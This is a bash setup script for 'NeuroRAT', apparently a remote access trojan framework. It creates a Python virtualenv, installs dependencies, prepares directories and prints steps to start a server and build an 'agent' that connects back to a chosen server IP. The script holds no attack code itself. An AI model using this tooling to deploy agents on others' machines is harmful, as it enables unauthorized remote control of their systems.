#!/bin/bash

# NeuroRAT Deployment Script
# Author: Mr. Thomas Anderson (iamnobodynothing@gmail.com)
# License: MIT

set -e

# Color settings
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ████████╗"
echo "████╗  ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝"
echo "██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║██████╔╝███████║   ██║   "
echo "██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   "
echo "██║ ╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║   ██║   "
echo "╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo -e "${NC}"
echo -e "${YELLOW}Deployment Script${NC}"
echo -e "${YELLOW}Author: Mr. Thomas Anderson${NC}"
echo -e "${YELLOW}License: MIT${NC}"
echo ""

# Function for error handling
handle_error() {
    echo -e "${RED}Error: $1${NC}"
    exit 1
}

# Check if Python is installed
if ! command -v python3 &> /dev/null; then
    handle_error "Python 3 is not installed. Please install Python 3.8 or higher."
fi

# Check Python version
PYTHON_VERSION=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
if (( $(echo "$PYTHON_VERSION < 3.8" | bc -l) )); then
    handle_error "Python version must be 3.8 or higher. Current version: $PYTHON_VERSION"
fi

# Create virtual environment
echo -e "${BLUE}Creating virtual environment...${NC}"
if [ ! -d "venv" ]; then
    python3 -m venv venv || handle_error "Failed to create virtual environment."
    echo -e "${GREEN}Virtual environment created.${NC}"
else
    echo -e "${YELLOW}Virtual environment already exists.${NC}"
fi

# Activate virtual environment
echo -e "${BLUE}Activating virtual environment...${NC}"
source venv/bin/activate || handle_error "Failed to activate virtual environment."
echo -e "${GREEN}Virtual environment activated.${NC}"

# Install dependencies
echo -e "${BLUE}Installing dependencies...${NC}"
pip install -U pip || handle_error "Failed to upgrade pip."
pip install -r requirements.txt || handle_error "Failed to install dependencies."
echo -e "${GREEN}Dependencies installed.${NC}"

# Create necessary directories
echo -e "${BLUE}Creating necessary directories...${NC}"
mkdir -p logs
mkdir -p data
mkdir -p agent_modules
echo -e "${GREEN}Directories created.${NC}"

# Make scripts executable
echo -e "${BLUE}Making scripts executable...${NC}"
chmod +x *.py
chmod +x *.sh
echo -e "${GREEN}Scripts are now executable.${NC}"

# Check if server files exist
if [ ! -f "agent_protocol/examples/neurorat_server.py" ]; then
    echo -e "${YELLOW}Warning: Server file 'agent_protocol/examples/neurorat_server.py' not found.${NC}"
    echo -e "${YELLOW}You may need to initialize the agent_protocol submodule.${NC}"
fi

# Setup completed
echo -e "${GREEN}NeuroRAT setup completed successfully!${NC}"
echo ""
echo -e "${BLUE}To start the server:${NC}"
echo "  ./start_server.sh"
echo ""
echo -e "${BLUE}To build an agent:${NC}"
echo "  python build_agent.py --server <your_server_ip> --port 8000 --type zip"
echo ""
echo -e "${BLUE}For more information, see:${NC}"
echo "  - README.md - Project overview"
echo "  - USAGE.md - Detailed usage instructions"
echo ""
echo -e "${YELLOW}Remember to use responsibly and ethically.${NC}"

# Deactivate virtual environment
deactivate 